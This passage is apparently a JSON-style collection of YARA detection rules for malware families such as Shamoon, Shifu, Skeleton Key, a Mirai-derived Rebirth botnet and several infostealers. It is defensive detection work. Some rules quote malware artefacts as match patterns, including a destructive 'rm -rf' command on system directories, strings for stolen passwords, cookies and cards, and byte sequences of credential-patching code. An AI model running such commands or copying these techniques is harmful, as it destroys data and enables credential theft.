\"d820ec7f9196a5cc3dbc2b5860334a2e174fede80efc3b8463756fb8767dddf9\"\n        hash8 = \"d4572e26b9e6ce963af590979afe3df6e1be78aa8ec0e926e77b0affb7ab1554\"\n        hash9 = \"4b3cb90581dcd77c9ceffbd662b8dac70b68de5a03cd56940434cc035209d61d\"\n\n    strings:\n        $MZ = {4D 5A}\n        $decoderoutine = { 8B 45 E8 33 C9 8A 04 07 28 04 1A 42 83 FF 07 8D 47 01 0F 45 C8 8B F9 3B D6 7C E5 }\n        /*\n        generic routine used to decode strings (bot name, bot version, mutex, c2 url, etc..)\n        /8B45 E8         /MOV EAX,[LOCAL.6]\n        |33C9            |XOR ECX,ECX\n        |8A0407          |MOV AL,BYTE PTR DS:[EDI+EAX]\n        |28041A          |SUB BYTE PTR DS:[EDX+EBX],AL\n        |42              |INC EDX\n        |83FF 07         |CMP EDI,7\n        |8D47 01         |LEA EAX,DWORD PTR DS:[EDI+1]\n        |0F45C8          |CMOVNE ECX,EAX\n        |8BF9            |MOV EDI,ECX\n        |3BD6            |CMP EDX,ESI\n        \\7C E5           \\JL SHORT 76bffcf0.0135B57F\n        */\n\n        // Regular strings that can be found into purplewave 1.0 samples\n        $string1 = \" at t.me/LuckyStoreSupport |\" fullword wide\n        $string2 = \"][aes_key]\" wide ascii\n        $string3 = \"][passwords][\" wide ascii\n        $string4 = \"][is_encrypted]\" wide ascii\n        $string5 = \"][cards][\" wide ascii\n        $string6 = \"][number]\" wide ascii\n        $string7 = \"][domain]\" wide ascii\n        $string8 = \"][cookies][\" wide ascii\n        $string9 = \"][flag]\" wide ascii\n        $string10 = \"][histories][\" wide ascii\n        $string11 = \"D877F783D5D3EF8C\" wide ascii\n\n        $alphabet1 = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\"\n        $alphabet2 = \"0123456789abcdefghijklmnopqrstuvwxyz\"\n\n    condition: \n\t($MZ at 0 and $decoderoutine) and\n\t(\n\t\t(5 of ($string*) and all of ($alphabet*))\n\t)\n\n\tand filesize < 700KB // Standard size when not packed should be arround ~598/600kb\n}",
  "MALW_FakePyPI": "rule MALW_FakePyPI\n{\nmeta:\n\tdescription = \"Identifies fake PyPI Packages.\"\n\tauthor = \"@bartblaze\"\n\treference = \"http://www.nbu.gov.sk/skcsirt-sa-20170909-pypi/\"\n\tdate = \"2017-09\"\n\ttlp = \"white\"\n\nstrings:\t\n\t$ = \"# Welcome Here! :)\"\n\t$ = \"# just toy, no harm :)\"\n\t$ = \"[0x76,0x21,0xfe,0xcc,0xee]\"\n\ncondition:\n\tall of them\n}",
  "PE_File_pyinstaller": "rule PE_File_pyinstaller\n{\n    meta:\n        author = \"Didier Stevens (https://DidierStevens.com)\"\n        description = \"Detect PE file produced by pyinstaller\"\n        reference = \"https://isc.sans.edu/diary/21057\"\n    strings:\n        $a = \"pyi-windows-manifest-filename\"\n    condition:\n        pe.number_of_resources > 0 and $a\n}",
  "MachO_File_pyinstaller": "rule MachO_File_pyinstaller\n{\n    meta:\n        author = \"KatsuragiCSL (https://katsuragicsl.github.io)\"\n        description = \"Detect Mach-O file produced by pyinstaller\"\n    strings:\n        $a = \"pyi-runtime-tmpdir\"\n        $b = \"pyi-bootloader-ignore-signals\"\n    condition:\n        any of them\n}",
  "Quarian": "rule Quarian : Family\n{\n    meta:\n        description = \"Quarian\"\n        author = \"Seth Hardy\"\n        last_modified = \"2014-07-09\"\n        \n    condition:\n        QuarianCode or QuarianStrings\n}",
  "is__str_Rebirth_gen3": "rule is__str_Rebirth_gen3 {\n\tmeta:\n\t\tdescription = \"Generic detection for Vulcan branch Rebirth or Katrina from Torlus nextgen\"\n\t\treference = \"https://imgur.com/a/SSKmu\"\n\t\treference = \"https://www.reddit.com/r/LinuxMalware/comments/7rprnx/vulcan_aka_linuxrebirth_or_katrina_variant_of/\"\n\t\tauthor = \"unixfreaxjp\"\n\t\torg = \"MalwareMustDie\"\n\t\tdate = \"2018-01-21\"\n\tstrings:\n        \t$str01 = \"/usr/bin/python\" fullword nocase wide ascii\n        \t$str02 = \"nameserver 8.8.8.8\\nnameserver 8.8.4.4\\n\" fullword nocase wide ascii\n        \t$str03 = \"Telnet Range %d->%d\" fullword nocase wide ascii\n        \t$str04 = \"Mirai Range %d->%d\" fullword nocase wide ascii\n        \t$str05 = \"[Updating] [%s:%s]\" fullword nocase wide ascii\n        \t$str06 = \"rm -rf /tmp/* /var/* /var/run/* /var/tmp/*\" fullword nocase wide ascii\n\t\t$str07 = \"\\x1B[96m[DEVICE] \\x1B[97mConnected\" fullword nocase wide ascii\n\tcondition:\n        \t4 of them\n}",
  "is__hex_Rebirth_gen3": "rule is__hex_Rebirth_gen3 {\n\tmeta:\n\t\tauthor = \"unixfreaxjp\"\n\t\tdate = \"2018-01-21\"\n\tstrings:\n\t\t$hex01 = { 0D C0 A0 E1 00 D8 2D E9 }\n\t\t$hex02 = { 3C 1C 00 06 27 9C 97 98 }\n\t\t$hex03 = { 94 21 EF 80 7C 08 02 A6 }\n\t\t$hex04 = { E6 2F 22 4F 76 91 18 3F }\n\t\t$hex05 = { 06 00 1C 3C 20 98 9C 27 }\n\t\t$hex06 = { 55 89 E5 81 EC ?? 10 00 }\n\t\t$hex07 = { 55 48 89 E5 48 81 EC 90 }\n\t\t$hex08 = { 6F 67 69 6E 00 }\n\tcondition:\n        \t2 of them \n}",
  "is__bot_Rebirth_gen3": "rule is__bot_Rebirth_gen3 {\n\tmeta:\n\t\tauthor = \"unixfreaxjp\"\n\t\tdate = \"2018-01-21\"\n\tstrings:\n        \t$bot01 = \"MIRAITEST\" fullword nocase wide ascii\n        \t$bot02 = \"TELNETTEST\" fullword nocase wide ascii\n        \t$bot03 = \"UPDATE\" fullword nocase wide ascii\n        \t$bot04 = \"PHONE\" fullword nocase wide ascii\n        \t$bot05 = \"RANGE\" fullword nocase wide ascii\n\t\t$bot06 = \"KILLATTK\" fullword nocase wide ascii\n\t\t$bot07 = \"STD\" fullword nocase wide ascii\n        \t$bot08 = \"BCM\" fullword nocase wide ascii\n\t\t$bot09 = \"NETIS\" fullword nocase wide ascii\n\t\t$bot10 = \"FASTLOAD\" fullword nocase wide ascii\n\tcondition:\n        \t6 of them\n}",
  "MALW_Rebirth_Vulcan_ELF": "rule MALW_Rebirth_Vulcan_ELF {\n\tmeta:\n\t\tdescription = \"Detects Rebirth Vulcan variant a torlus NextGen MALW\"\n\t\tdescription = \"Just adjust or omit below two strings for next version they code :) @unixfreaxjp\"\n\t\tdate = \"2018-01-21\"\n\tstrings:\n                $spec01 = \"vulcan.sh\" fullword nocase wide ascii\n\t\t$spec02 = \"Vulcan\" fullword nocase wide ascii\n\tcondition:\n                all of them\n\t\tand is__elf\n\t\tand is__str_Rebirth_gen3\n\t\tand is__hex_Rebirth_gen3\n\t\tand is__bot_Rebirth_gen3\n\t\tand filesize < 300KB \n}",
  "RegSubDat": "rule RegSubDat : Family\n{\n    meta:\n        description = \"RegSubDat\"\n        author = \"Seth Hardy\"\n        last_modified = \"2014-07-14\"\n        \n    condition:\n        RegSubDatCode or RegSubDatStrings\n}",
  "rar_with_js": "rule rar_with_js\n{\n  strings:\n  $h1 = \"Rar!\" \n  $s1 = \".js\" nocase\n    \n  condition:\n    $h1 at 0 and $s1\n}",
  "RockLoader": "rule RockLoader{\nmeta:\nname = \"RockLoader\"\ndescription = \"RockLoader Malware\"\nauthor = \"@seanmw\"\nstrings:\n$hdr = {4d 5a 90 00}\n$op1 = {39 45 f0 0f 8e b0 00 00 00}\n$op2 = {32 03 77 73 70 72 69 6e 74 66 41 00 ce 02 53 65}\ncondition:\n$hdr at 0 and all of ($op*) and filesize < 500KB\n}",
  "Rooter": "rule Rooter : Family\n{\n    meta:\n        description = \"Rooter\"\n        author = \"Seth Hardy\"\n        last_modified = \"2014-07-10\"\n        \n    condition:\n        RooterCode or RooterStrings\n}",
  "Rookie": "rule Rookie : Family\n{\n    meta:\n        description = \"Rookie\"\n        author = \"Seth Hardy\"\n        last_modified = \"2014-06-25\"\n        \n    condition:\n        RookieCode or RookieStrings\n}",
  "rovnix_downloader": "rule rovnix_downloader : downloader \n{\n\tmeta:\n\t\tauthor=\"Intel Security\"\n\t\tdescription=\"Rovnix downloader with sinkhole checks\"\n\t\treference = \"https://blogs.mcafee.com/mcafee-labs/rovnix-downloader-sinkhole-time-checks/\"\n\tstrings:\n\t\t\t$sink1= \"control\"\n\t\t\t$sink2 = \"sink\"\n\t\t\t$sink3 = \"hole\"\n\t\t\t$sink4= \"dynadot\"\n\t\t\t$sink5= \"block\"\n\t\t\t$sink6= \"malw\"\n\t\t\t$sink7= \"anti\"\n\t\t\t$sink8= \"googl\"\n\t\t\t$sink9= \"hack\"\n\t\t\t$sink10= \"trojan\"\n\t\t\t$sink11= \"abuse\"\n\t\t\t$sink12= \"virus\"\n\t\t\t$sink13= \"black\"\n\t\t\t$sink14= \"spam\"\n\t\t\t$boot= \"BOOTKIT_DLL.dll\"\n\t\t\t$mz = { 4D 5A }\n\tcondition:\n\t\t$mz in (0..2) and all of ($sink*) and $boot\n}",
  "SafeNet": "rule SafeNet : Family\n{\n    meta:\n        description = \"SafeNet family\"\n        \n    condition:\n        SafeNetCode or SafeNetStrings\n        \n}",
  "Sakurel_backdoor": "rule Sakurel_backdoor\n{\n\tmeta:\n\t\tmaltype = \"Sakurel backdoor\"\n    ref = \"https://github.com/reed1713\"\n\t\treference = \"http://www.microsoft.com/security/portal/threat/encyclopedia/entry.aspx?Name=Trojan:Win32/Sakurel.A#tab=2\"\n\t\tdescription = \"malware creates a process in the temp directory and performs the sysprep UAC bypass method.\"\n\tstrings:\n\t\t$type=\"Microsoft-Windows-Security-Auditing\"\n\t\t$eventid=\"4688\"\n\t\t$data=\"Windows\\\\System32\\\\sysprep\\\\sysprep.exe\" nocase\n\n\t\t$type1=\"Microsoft-Windows-Security-Auditing\"\n\t\t$eventid1=\"4688\"\n\t\t$data1=\"AppData\\\\Local\\\\Temp\\\\MicroMedia\\\\MediaCenter.exe\" nocase\n\tcondition:\n\t\tall of them\n}",
  "Vinsula_Sayad_Client": "rule Vinsula_Sayad_Client : infostealer\n{\n    meta:\n        Author      = \"Vinsula, Inc\"\n        Date        = \"2014/06/20\"\n        Description = \"Sayad Infostealer Client\"\n        Reference   = \"http://vinsula.com/2014/07/20/sayad-flying-kitten-infostealer-malware/\"\n\n    strings: \n        $pdbstr = \"\\\\Projects\\\\C#\\\\Sayad\\\\Source\\\\Client\\\\bin\\\\x86\\\\Debug\\\\Client.pdb\" \n        $sayadconfig = \"base.dll\" wide\n        $sqlite3str = \"sqlite3.dll\" nocase\n        $debugstr01 = \"Config loaded\" wide\n        $debugstr02 = \"Config parsed\" wide\n        $debugstr03 = \"storage uploader\" wide\n        $debugstr04 = \"updater\" wide\n        $debugstr05 = \"keylogger\" wide\n        $debugstr06 = \"Screenshot\" wide\n        $debugstr07 = \"sqlite found & start collectiong data\" wide\n        $debugstr08 = \"Machine info collected\" wide\n        $debugstr09 = \"browser ok\" wide\n        $debugstr10 = \"messenger ok\" wide\n        $debugstr11 = \"vpn ok\" wide\n        $debugstr12 = \"ftp client ok\" wide\n        $debugstr13 = \"ftp server ok\" wide\n        $debugstr14 = \"rdp ok\" wide\n        $debugstr15 = \"kerio ok\" wide\n        $debugstr16 = \"skype ok\" wide\n        $debugstr17 = \"serialize data ok\" wide\n        $debugstr18 = \"Keylogged\" wide\n\n    condition:\n        all of them\n}",
  "Scarhikn": "rule Scarhikn : Family\n{\n    meta:\n        description = \"Scarhikn\"\n        author = \"Seth Hardy\"\n        last_modified = \"2014-06-25\"\n        \n    condition:\n        ScarhiknCode or ScarhiknStrings\n}",
  "sendsafe": "rule sendsafe {\n\n    meta:\n        author = \" J from THL <j@techhelplist.com>\"\n        date = \"2016/09\"\n        reference = \"http://pastebin.com/WPWWs406\"\n\t\tversion = 2\n        maltype = \"Spammer\"\n        filetype = \"memory\"\n\n    strings:\n        $a = \"Enterprise Mailing Service\"\n        $b = \"Blacklisted by rule: %s:%s\"\n        $c = \"/SuccessMails?CampaignNum=%ld\"\n        $d = \"/TimedOutMails?CampaignNum=%ld\"\n        $e = \"/InvalidMails?CampaignNum=%ld\"\n        $f = \"Failed to download maillist, retrying\"\n        $g = \"No maillist loaded\"\n        $h = \"Successfully sent using SMTP account %s (%d of %ld messages to %s)\"\n        $i = \"Successfully sent %d of %ld messages to %s\"\n        $j = \"Sending to %s in the same connection\"\n        $k = \"New connection required, will send to %s\"\n\t\t$l = \"Mail transaction for %s is over.\"\n\t\t$m = \"Domain %s is bad (found in cache)\"\n\t\t$n = \"Domain %s found in cache\"\n\t\t$o = \"Domain %s isn't found in cache, resolving it\"\n\t\t$p = \"All tries to resolve %s failed.\"\n\t\t$q = \"Failed to receive response for %s from DNS server\"\n\t\t$r = \"Got DNS server response: domain %s is bad\"\n\t\t$s = \"Got error %d in response for %s from DNS server\"\n\t\t$t = \"MX's IP for domain %s found in cache:\"\n\t\t$u = \"Timeout waiting for domain %s to be resolved\"\n\t\t$v = \"No valid MXes for domain %s. Marking it as bad\"\n\t\t$w = \"Resolving MX %s using existing connection to DNS server\"\n\t\t$x = \"All tries to resolve MX for %s are failed\"\n\t\t$y = \"Resolving MX %s using DNS server\"\n\t\t$z = \"Failed to receive response for MX %s from DNS server\"\n\n    condition:\n        13 of them\n}",
  "CrowdStrike_Shamoon_DroppedFile": "rule CrowdStrike_Shamoon_DroppedFile { \n\tmeta:\n\t\tdescription = \"Rule to detect Shamoon malware http://goo.gl/QTxohN\"\n\t\treference = \"http://www.rsaconference.com/writable/presentations/file_upload/exp-w01-hacking-exposed-day-of-destruction.pdf\"\n\tstrings:\n\t\t$testn123 = \"test123\" wide\n\t\t$testn456 = \"test456\" wide\n\t\t$testn789 = \"test789\" wide\n\t\t$testdomain = \"testdomain.com\" wide $pingcmd = \"ping -n 30 127.0.0.1 >nul\" wide\n\tcondition:\n\t\t(any of ($testn*) or $pingcmd) and $testdomain\n}",
  "Shamoon2_Wiper": "rule Shamoon2_Wiper {\n   meta:\n      description = \"Detects Shamoon 2.0 Wiper Component\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/jKIfGB\"\n      date = \"2016-12-01\"\n      score = 70\n      hash1 = \"c7fc1f9c2bed748b50a599ee2fa609eb7c9ddaeb9cd16633ba0d10cf66891d8a\"\n      hash2 = \"128fa5815c6fee68463b18051c1a1ccdf28c599ce321691686b1efa4838a2acd\"\n   strings:\n      $a1 = \"\\\\??\\\\%s\\\\System32\\\\%s.exe\" fullword wide\n      $x1 = \"IWHBWWHVCIDBRAFUASIIWURRTWRTIBIVJDGWTRRREFDEAEBIAEBJGGCSVUHGVJUHADIEWAFGWADRUWDTJBHTSITDVVBCIDCWHRHVTDVCDESTHWSUAEHGTWTJWFIRTBRB\" wide\n      $s1 = \"UFWYNYNTS\" fullword wide\n      $s2 = \"\\\\\\\\?\\\\ElRawDisk\" fullword wide\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 1000KB and 2 of them ) or ( 3 of them )\n}",
  "Shamoon2_ComComp": "rule Shamoon2_ComComp {\n   meta:\n      description = \"Detects Shamoon 2.0 Communication Components\"\n      author = \"Florian Roth (with Binar.ly)\"\n      reference = \"https://goo.gl/jKIfGB\"\n      date = \"2016-12-01\"\n      score = 70\n      hash1 = \"61c1c8fc8b268127751ac565ed4abd6bdab8d2d0f2ff6074291b2d54b0228842\"\n   strings:\n      $s1 = \"mkdir %s%s > nul 2>&1\" fullword ascii\n      $s2 = \"p[%s%s%d.%s\" fullword ascii\n\n      $op1 = { 04 32 cb 88 04 37 88 4c 37 01 88 54 37 02 83 c6 }\n      $op2 = { c8 02 d2 c0 e9 06 02 d2 24 3f 02 d1 88 45 fb 8d }\n      $op3 = { 0c 3b 40 8d 4e 01 47 3b c1 7c d8 83 fe 03 7d 1c }\n   condition:\n      uint16(0) == 0x5a4d and filesize < 500KB and ( all of ($s*) or all of ($op*) )\n}",
  "EldoS_RawDisk": "rule EldoS_RawDisk {\n   meta:\n      description = \"EldoS Rawdisk Device Driver (Commercial raw disk access driver - used in Operation Shamoon 2.0)\"\n      author = \"Florian Roth (with Binar.ly)\"\n      reference = \"https://goo.gl/jKIfGB\"\n      date = \"2016-12-01\"\n      score = 50\n      hash1 = \"47bb36cd2832a18b5ae951cf5a7d44fba6d8f5dca0a372392d40f51d1fe1ac34\"\n      hash2 = \"394a7ebad5dfc13d6c75945a61063470dc3b68f7a207613b79ef000e1990909b\"\n   strings:\n      $s1 = \"g\\\\system32\\\\\" fullword wide\n      $s2 = \"ztvttw\" fullword wide\n      $s3 = \"lwizvm\" fullword ascii\n      $s4 = \"FEJIKC\" fullword ascii\n      $s5 = \"INZQND\" fullword ascii\n      $s6 = \"IUTLOM\" fullword wide\n      $s7 = \"DKFKCK\" fullword ascii\n\n      $op1 = { 94 35 77 73 03 40 eb e9 }\n      $op2 = { 80 7c 41 01 00 74 0a 3d }\n      $op3 = { 74 0a 3d 00 94 35 77 }\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 2000KB and 4 of them )\n}",
  "Shamoon_Disttrack_Dropper": "rule Shamoon_Disttrack_Dropper {\n   meta:\n      description = \"Detects Shamoon 2.0 Disttrack Dropper\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/jKIfGB\"\n      date = \"2016-12-01\"\n      score = 70\n      hash1 = \"4744df6ac02ff0a3f9ad0bf47b15854bbebb73c936dd02f7c79293a2828406f6\"\n      hash2 = \"5a826b4fa10891cf63aae832fc645ce680a483b915c608ca26cedbb173b1b80a\"\n   strings:\n      $a1 = \"\\\\#{9A6DB7D2-FECF-41ff-9A92-6EDA696613DF}#\" wide\n      $a2 = \"\\\\#{8A6DB7D2-FECF-41ff-9A92-6EDA696613DE}#\" wide\n\n      $s1 = \"\\\\amd64\\\\elrawdsk.pdb\" fullword ascii\n      $s2 = \"RawDiskSample.exe\" fullword wide\n      $s3 = \"RawDisk Driver. Allows write access to files and raw disk sectors for user mode applications in Windows 2000 and later.\" fullword wide\n      $s4 = \"elrawdsk.sys\" fullword wide\n      $s5 = \"\\\\DosDevices\\\\ElRawDisk\" fullword wide\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 90KB and 1 of ($a*) and 1 of ($s*) )\n}",
  "Shifu_Banking_Trojan_0": "rule Shifu_Banking_Trojan_0 : banking {\n\tmeta:\n\t\tdescription = \"Detects Shifu Banking Trojan\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"https://securityintelligence.com/shifu-masterful-new-banking-trojan-is-attacking-14-japanese-banks/\"\n\t\tdate = \"2015-09-01\"\n\t\thash1 = \"4ff1ebea2096f318a2252ebe1726bcf3bbc295da9204b6c720b5bbf14de14bb2\"\n\t\thash2 = \"4881c7d89c2b5e934d4741a653fbdaf87cc5e7571b68c723504069d519d8a737\"\n\tstrings:\n\t\t$x1 = \"c:\\\\oil\\\\feet\\\\Seven\\\\Send\\\\Gather\\\\Dividerail.pdb\" fullword ascii\n\n\t\t$s1 = \"listen above\" fullword wide\n\t\t$s2 = \"familycould cost\" fullword wide\n\t\t$s3 = \"SetSystemTimeAdjustment\" fullword ascii /* Goodware String - occured 33 times */\n\t\t$s4 = \"PeekNamedPipe\" fullword ascii /* Goodware String - occured 347 times */\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 1000KB and ($x1 or all of ($s*))\n}",
  "SHIFU_Banking_Trojan_1": "rule SHIFU_Banking_Trojan_1 : banking {\n\tmeta:\n\t\tdescription = \"Detects SHIFU Banking Trojan\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://goo.gl/52n8WE\"\n\t\tdate = \"2015-10-31\"\n\t\tscore = 70\n\t\thash1 = \"0066d1c8053ff8b0c07418c7f8d20e5cd64007bb850944269f611febd0c1afe0\"\n\t\thash2 = \"3956d32a870d81be34cafc867769b2a2f55a96360070f1cb3d9addc2918357d5\"\n\t\thash3 = \"3fde1b2b50fcb36a695f1e6bc577cd930c2343066d98982cf982393e55bfce0d\"\n\t\thash4 = \"457ad4a4d4e675fe09f63873ca3364434dc872dde7d9b64ce7db919eaff47485\"\n\t\thash5 = \"51edba913e8b83d1388b1be975957e439015289d51d3d5774d501551f220df6f\"\n\t\thash6 = \"6611a2b79a3acf0003b1197aa5bfe488a33db69b663c79c6c5b023e86818d38b\"\n\t\thash7 = \"72e239924faebf8209f8e3d093f264f778a55efb56b619f26cea73b1c4feb7a4\"\n\t\thash8 = \"7a29cb641b9ac33d1bb405d364bc6e9c7ce3e218a8ff295b75ca0922cf418290\"\n\t\thash9 = \"92fe4f9a87c796e993820d1bda8040aced36e316de67c9c0c5fc71aadc41e0f8\"\n\t\thash10 = \"93ecb6bd7c76e1b66f8c176418e73e274e2c705986d4ac9ede9d25db4091ab05\"\n\t\thash11 = \"a0b7fac69a4eb32953c16597da753b15060f6eba452d150109ff8aabc2c56123\"\n\t\thash12 = \"a8b6e798116ce0b268e2c9afac61536b8722e86b958bd2ee95c6ecdec86130c9\"\n\t\thash13 = \"d6244c1177b679b3d67f6cec34fe0ae87fba21998d4f5024d8eeaf15ca242503\"\n\t\thash14 = \"dcc9c38e695ffd121e793c91ca611a4025a116321443297f710a47ce06afb36d\"\n\tstrings:\n\t\t$x1 = \"\\\\Gather\\\\Dividerail.pdb\" ascii\n\n\t\t$s0 = \"\\\\payload\\\\payload.x86.pdb\" ascii\n\t\t$s1 = \"USER_PRIV_GUEST\" fullword wide\n\t\t$s2 = \"USER_PRIV_ADMIN\" fullword wide\n\t\t$s3 = \"USER_PRIV_USER\" fullword wide\n\t\t$s4 = \"PPSWVPP\" fullword ascii\n\t\t$s5 = \"WinSCard.dll\" fullword ascii /* Goodware String - occured 83 times */\n\tcondition:\n\t\tuint16(0) == 0x5a4d and ($x1 or 5 of ($s*))\n}",
  "Shifu": "rule Shifu : banking {\n\tmeta:\n\t\treference = \"https://blogs.mcafee.com/mcafee-labs/japanese-banking-trojan-shifu-combines-malware-tools/\"\n\t\tauthor = \"McAfee Labs\"\n\tstrings:\n\t\t$b = \"RegCreateKeyA\"\n\t\t$a = \"CryptCreateHash\"\n\t\t$c = {2F 00 63 00 20 00 73 00 74 00 61 00 72 00 74 00 20 00 22 00 22 00 20 00 22 00 25 00 73 00 22 00 20 00 25 00 73 00 00 00 00 00 63 00 6D 00 64 00 2E 00 65 00 78 00 65 00 00 00 72 00 75 00 6E}\n\t\t$d = {53 00 6E 00 64 00 56 00 6F 00 6C 00 2E 00 65 00 78 00 65}\n\t\t$e = {52 00 65 00 64 00 69 00 72 00 65 00 63 00 74 00 45 00 58 00 45}\n\tcondition:\n\t\tall of them\n}",
  "skeleton_key_patcher": "rule skeleton_key_patcher\n{\n\tmeta:\n\t\tdescription = \"Skeleton Key Patcher from Dell SecureWorks Report http://goo.gl/aAk3lN\"\n\t\tauthor = \"Dell SecureWorks Counter Threat Unit\"\n\t\treference = \"http://goo.gl/aAk3lN\"\n\t\tdate = \"2015/01/13\"\n\t\tscore = 70\n\tstrings:\n\t\t$target_process = \"lsass.exe\" wide\n\t\t$dll1 = \"cryptdll.dll\"\n\t\t$dll2 = \"samsrv.dll\"\n\n\t\t$name = \"HookDC.dll\"\n\n\t\t$patched1 = \"CDLocateCSystem\"\n\t\t$patched2 = \"SamIRetrievePrimaryCredentials\"\n\t\t$patched3 = \"SamIRetrieveMultiplePrimaryCredentials\"\n\tcondition:\n\t\tall of them\n}",
  "skeleton_key_injected_code": "rule skeleton_key_injected_code\n{\n\tmeta:\n\t\tdescription = \"Skeleton Key injected Code http://goo.gl/aAk3lN\"\n\t\tauthor = \"Dell SecureWorks Counter Threat Unit\"\n\t\treference = \"http://goo.gl/aAk3lN\"\n\t\tdate = \"2015/01/13\"\n\t\tscore = 70\n\tstrings:\n\t\t$injected = { 33 C0 85 C9 0F 95 C0 48 8B 8C 24 40 01 00 00 48 33 CC E8 4D 02 00 00 48 81 C4 58 01 00 00 C3 }\n\n\t\t$patch_CDLocateCSystem = { 48 89 5C 24 08 48 89 74 24 10 57 48 83 EC 20 48 8B FA 8B F1 E8 ?? ?? ?? ?? 48 8B D7 8B CE 48 8B D8 FF 50 10 44 8B D8 85 C0 0F 88 A5 00 00 00 48 85 FF 0F 84 9C 00 00 00 83 FE 17 0F 85 93 00 00 00 48 8B 07 48 85 C0 0F 84 84 00 00 00 48 83 BB 48 01 00 00 00 75 73 48 89 83 48 01 00 00 33 D2 }\n\n\t\t$patch_SamIRetrievePrimaryCredential = { 48 89 5C 24 08 48 89 6C 24 10 48 89 74 24 18 57 48 83 EC 20 49 8B F9 49 8B F0 48 8B DA 48 8B E9 48 85 D2 74 2A 48 8B 42 08 48 85 C0 74 21 66 83 3A 26 75 1B 66 83 38 4B 75 15 66 83 78 0E 73 75 0E 66 83 78 1E 4B 75 07 B8 A1 02 00 C0 EB 14 E8 ?? ?? ?? ?? 4C 8B CF 4C 8B C6 48 8B D3 48 8B CD FF 50 18 48 8B 5C 24 30 48 8B 6C 24 38 48 8B 74 24 40 48 83 C4 20 5F C3 }\n\n\t\t$patch_SamIRetrieveMultiplePrimaryCredential  = { 48 89 5C 24 08 48 89 6C 24 10 48 89 74 24 18 57 48 83 EC 20 41 8B F9 49 8B D8 8B F2 8B E9 4D 85 C0 74 2B 49 8B 40 08 48 85 C0 74 22 66 41 83 38 26 75 1B 66 83 38 4B 75 15 66 83 78 0E 73 75 0E 66 83 78 1E 4B 75 07 B8 A1 02 00 C0 EB 12 E8 ?? ?? ?? ?? 44 8B CF 4C 8B C3 8B D6 8B CD FF 50 20 48 8B 5C 24 30 48 8B 6C 24 38 48 8B 74 24 40 48 83 C4 20 5F C3 }\n\n\tcondition:\n\t\tany of them\n}",
  "Spora": "rule Spora\n{\n    meta:\n        author = \"pekeinfo\"\n        date = \"2017-02-22\"\n        description = \"Spora\"\n    \n    strings:\n        $a={7B 7F 4E 11 5D F3 FE 15 F9 55 FD 00 AD E9 CF FE E2 56 78 03 D0 21 46 00 30 68 C4 D0 01 FD 00 C3 B7 00 4A 0D 57 D2 52 91 05}\n        $b={6F 51 3E 6B F9 15 29 D9 DF 26 1E 80 62 8A 0D E3 64 51 3B 0F F3 FE FF FF F3 FE FF FF F3 FE FF FF F3 FE FF FF}\n\n    condition:\n        $a and $b \n}",
  "unk_packer": "rule unk_packer\n{\n    meta:\n        author = \"pekeinfo\"\n        date = \"2017-02-22\"\n        description = \"Spora & Cerber ek\"\n\n    strings:\n        $a = {0E 9E 52 69 C8 E4 73 BF 87 2B 95 15 33 1B B7 6B 46 62 D8 C1 01 A9 F9 17 FC EF 1A 6E B7 36 3C C4 72 7D 5D 1A 2D C4 7E 70 E8 0A A0 C6 A3 51 C1 1C 5E 98 E2 72 19 DF 03 C9 D4 25 25 1F EF 6B 46 75 9C BB 1D D2 57 56 35 75 31 35 56 8F B7 5B 23 3D }\n        $b ={00 10 00 2E E8 77 EC FF FF 85 C0 0F 85 78 C4 FF}\n\n    condition:\n        $a and $b\n}",
  "with_sqlite": "rule with_sqlite : sqlite\n{\n\tmeta:\n\t\tauthor = \"Julian J. Gonzalez <info@seguridadparatodos.es>\"\n\t\treference = \"http://www.st2labs.com\"\n\t\tdescription = \"Rule to detect the presence of SQLite data in raw image\"\n\tstrings:\n\t\t$hex_string = {53 51 4c 69 74 65 20 66 6f 72 6d 61 74 20 33 00}\n\tcondition:\n\t\tall of them\n}",
  "universal_1337_stealer_serveur": "rule universal_1337_stealer_serveur : Stealer\n{\n\tmeta:\n\t\tauthor=\"Kevin Falcoz\"\n\t\tdate=\"24/02/2013\"\n\t\tdescription=\"Universal 1337 Stealer Serveur\"\n\t\t\n\tstrings:\n\t\t$signature1={2A 5B 53 2D 50 2D 4C 2D 49 2D 54 5D 2A} /*[S-P-L-I-T]*/\n\t\t$signature2={2A 5B 48 2D 45 2D 52 2D 45 5D 2A} /*[H-E-R-E]*/\n\t\t$signature3={46 54 50 7E} /*FTP~*/\n\t\t$signature4={7E 31 7E 31 7E 30 7E 30} /*~1~1~0~0*/\n\t\t\n\tcondition:\n\t\t$signature1 and $signature2 or $signature3 and $signature4\n}",
  "Surtr": "rule Surtr : Family {\n\tmeta:\n\t\tauthor = \"Katie Kleemola\"\n\t\tdescription = \"Rule for Surtr Stage One\"\n\t\tlast_updated = \"2014-07-16\"\n\n\tcondition:\n\t\tSurtrStrings or SurtrCode\n\n}",
  "T5000": "rule T5000 : Family\n{\n    meta:\n        description = \"T5000\"\n        author = \"Seth Hardy\"\n        last_modified = \"2014-06-26\"\n        \n    condition:\n        T5000Strings\n}",
  "hatman_setstatus": "rule hatman_setstatus : hatman {\n    strings:\n        $preset     = { 80 00 40 3c  00 00 62 80  40 00 80 3c  40 20 03 7c \n                        ?? ?? 82 40  04 00 62 80  60 00 80 3c  40 20 03 7c \n                        ?? ?? 82 40  ?? ?? 42 38                           }\n    condition:\n        $preset\n}",
  "hatman_memcpy": "rule hatman_memcpy : hatman {\n    strings:\n        $memcpy_be  = { 7c a9 03 a6  38 84 ff ff  38 63 ff ff  8c a4 00 01 \n                        9c a3 00 01  42 00 ff f8  4e 80 00 20              }\n        $memcpy_le  = { a6 03 a9 7c  ff ff 84 38  ff ff 63 38  01 00 a4 8c\n                        01 00 a3 9c  f8 ff 00 42  20 00 80 4e              }\n    condition:\n        $memcpy_be or $memcpy_le\n}",
  "hatman_dividers": "rule hatman_dividers : hatman {\n    strings:\n        $div1       = { 9a 78 56 00 }\n        $div2       = { 34 12 00 00 }\n    condition:\n        $div1 and $div2\n}",
